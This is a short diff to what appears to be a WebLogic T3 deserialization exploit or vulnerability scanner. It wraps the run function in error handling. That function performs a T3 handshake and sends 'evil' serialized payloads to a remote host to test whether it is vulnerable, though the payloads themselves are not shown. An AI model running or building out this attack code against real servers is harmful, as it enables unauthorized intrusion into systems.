@@ -60,10 +60,13 @@ def checkVul(res,server_addr,index,rip):
         pass
 
 def run(rip,rport,index):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(10)
-    server_addr = (rip, rport)
-    t3handshake(sock,server_addr)
-    buildT3RequestObject(sock,rport)
-    rs=sendEvilObjData(sock,PAYLOAD[index])
-    checkVul(rs,server_addr,index,rip)
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(10)
+        server_addr = (rip, rport)
+        t3handshake(sock,server_addr)
+        buildT3RequestObject(sock,rport)
+        rs=sendEvilObjData(sock,PAYLOAD[index])
+        return checkVul(rs,server_addr,index,rip)
+    except:
+        pass
